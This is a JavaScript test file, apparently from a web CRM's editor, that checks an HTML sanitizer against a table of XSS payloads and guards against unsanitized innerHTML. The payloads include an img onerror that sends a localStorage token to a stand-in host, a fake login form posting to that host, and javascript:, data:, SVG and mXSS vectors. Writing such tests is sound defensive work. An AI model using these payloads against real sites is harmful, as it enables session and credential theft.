import { describe, it, expect } from 'vitest';
import fs from 'fs';
import path from 'path';
import { sanitizeHtml } from '../src/lib/safeHtml.js';

// Cargas de ataque clásicas: lo que alguien con acceso a Documentos podría guardar para ejecutar código en la sesión de otra persona.
const ATAQUES = {
  'imagen con onerror': '<img src=x onerror="fetch(\'https://malo.test/?t=\'+localStorage.getItem(\'sb\'))">',
  'script directo': '<p>hola</p><script>alert(document.cookie)</script>',
  'enlace javascript:': '<a href="javascript:alert(1)">pulsa aquí</a>',
  'enlace javascript: con mayúsculas y espacios': '<a href=" JaVaScRiPt:alert(1)">x</a>',
  'enlace data:text/html': '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  'iframe': '<iframe src="https://malo.test/login"></iframe>',
  'svg con onload': '<svg onload=alert(1)><circle/></svg>',
  'math (mXSS)': '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  'object/embed': '<object data="https://malo.test/x.swf"></object><embed src="https://malo.test/x.swf">',
  'formulario falso': '<form action="https://malo.test/robar"><input name="clave"><button>Entrar</button></form>',
  'controlador en div': '<div onmouseover="alert(1)" onclick="alert(2)">x</div>',
  'estilo con expression/url': '<p style="background:url(https://malo.test/rastreo.png);width:expression(alert(1))">x</p>',
  'meta refresh y base': '<meta http-equiv="refresh" content="0;url=https://malo.test"><base href="https://malo.test/">',
  'imagen svg en base64': '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
};

describe('sanitizeHtml: lo peligroso se elimina', () => {
  for (const [nombre, html] of Object.entries(ATAQUES)) {
    it(nombre, () => {
      const limpio = sanitizeHtml(html);
      const dom = document.createElement('div'); dom.innerHTML = limpio;
      const peligroso = dom.querySelectorAll('script, iframe, object, embed, form, input, button, svg, math, meta, base, style, link').length > 0;
      const handlers = [...dom.querySelectorAll('*')].some((el) => [...el.attributes].some((a) => /^on/i.test(a.name)));
      const urlMala = [...dom.querySelectorAll('[href],[src]')].some((el) => /^\s*(javascript|vbscript|data:text|data:image\/svg)/i.test(el.getAttribute('href') || el.getAttribute('src') || ''));
      const estiloMalo = [...dom.querySelectorAll('[style]')].some((el) => /url\s*\(|expression|position/i.test(el.getAttribute('style')));
      expect({ peligroso, handlers, urlMala, estiloMalo }).toEqual({ peligroso: false, handlers: false, urlMala: false, estiloMalo: false });
      expect(limpio).not.toMatch(/onerror|onload|onclick|onmouseover|javascript:|<script|malo\.test\/robar/i);
    });
  }
  it('asignarlo a innerHTML ya no ejecuta nada', () => {
    window.__pwned = false;
    const div = document.createElement('div'); document.body.appendChild(div);
    div.innerHTML = sanitizeHtml('<img src=x onerror="window.__pwned=true"><svg onload="window.__pwned=true"></svg>');
    expect(window.__pwned).toBe(false); div.remove();
  });
});

describe('sanitizeHtml: lo legítimo del editor se conserva', () => {
  it('títulos, negritas, listas, tablas, citas y código', () => {
    const html = '<h1>Título</h1><p><strong>negrita</strong> <em>cursiva</em> <u>sub</u></p><ul><li>uno</li></ul><ol><li>dos</li></ol><blockquote>cita</blockquote><pre><code>x = 1</code></pre><table><thead><tr><th>A</th></tr></thead><tbody><tr><td colspan="2">1</td></tr></tbody></table><hr>';
    expect(sanitizeHtml(html)).toBe(html);
  });
  it('colores, tamaños y fuentes del editor', () => {
    const limpio = sanitizeHtml('<span style="color: rgb(133, 0, 255); font-size: 18px; font-family: Sora">hola</span><font color="#ef4444" face="Georgia" size="5">x</font>');
    expect(limpio).toContain('color: rgb(133, 0, 255)'); expect(limpio).toContain('font-size: 18px'); expect(limpio).toContain('<font color="#ef4444"');
  });
  it('enlaces web/correo/teléfono se conservan; los que abren pestaña nueva reciben rel="noopener noreferrer"', () => {
    const limpio = sanitizeHtml('<a href="https://bitproximity.com" target="_blank">web</a><a href="mailto:a@b.com">m</a><a href="tel:+5076000000">t</a><a href="/deals/1">interno</a><a href="#seccion">ancla</a>');
    expect(limpio).toContain('href="https://bitproximity.com"'); expect(limpio).toContain('rel="noopener noreferrer"');
    expect(limpio).toContain('mailto:a@b.com'); expect(limpio).toContain('tel:+5076000000'); expect(limpio).toContain('href="/deals/1"'); expect(limpio).toContain('href="#seccion"');
  });
  it('imágenes por https y en base64 (png/jpg/gif/webp)', () => {
    const limpio = sanitizeHtml('<img src="https://cdn.test/a.png" alt="a"><img src="data:image/png;base64,iVBORw0KGgo=">');
    expect(limpio).toContain('src="https://cdn.test/a.png"'); expect(limpio).toContain('data:image/png;base64,iVBORw0KGgo=');
  });
  it('vacío, null y números no rompen', () => {
    expect(sanitizeHtml('')).toBe(''); expect(sanitizeHtml(null)).toBe(''); expect(sanitizeHtml(undefined)).toBe(''); expect(sanitizeHtml(42)).toBe('42');
  });
  it('texto con símbolos < y & se conserva como texto', () => {
    expect(sanitizeHtml('<p>5 &lt; 6 &amp; 7 &gt; 3</p>')).toBe('<p>5 &lt; 6 &amp; 7 &gt; 3</p>');
  });
});

describe('Guardia de regresión: nadie escribe HTML sin limpiar', () => {
  const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(path.join(d, e.name)) : /\.(jsx?|tsx?)$/.test(e.name) ? [path.join(d, e.name)] : []));
  const files = walk(path.resolve(__dirname, '../src'));
  it('no existe dangerouslySetInnerHTML en el código', () => {
    expect(files.filter((f) => /dangerouslySetInnerHTML/.test(fs.readFileSync(f, 'utf8'))).map((f) => path.basename(f))).toEqual([]);
  });
  it('toda asignación a .innerHTML pasa por sanitizeHtml (salvo la plantilla fija del formulario incrustable)', () => {
    const malas = [];
    for (const f of files) fs.readFileSync(f, 'utf8').split('\n').forEach((l, i) => {
      if (/\.innerHTML\s*=/.test(l) && !/sanitizeHtml\(/.test(l) && !/¡Gracias! Te contactaremos pronto/.test(l)) malas.push(`${path.basename(f)}:${i + 1}`);
    });
    expect(malas).toEqual([]);
  });
  it('el editor limpia al CARGAR y al GUARDAR el documento', () => {
    const src = fs.readFileSync(path.resolve(__dirname, '../src/pages/Documents.jsx'), 'utf8');
    expect(src).toMatch(/innerHTML = sanitizeHtml\(/); expect(src).toMatch(/content: sanitizeHtml\(newContentHtml\)/);
  });
});
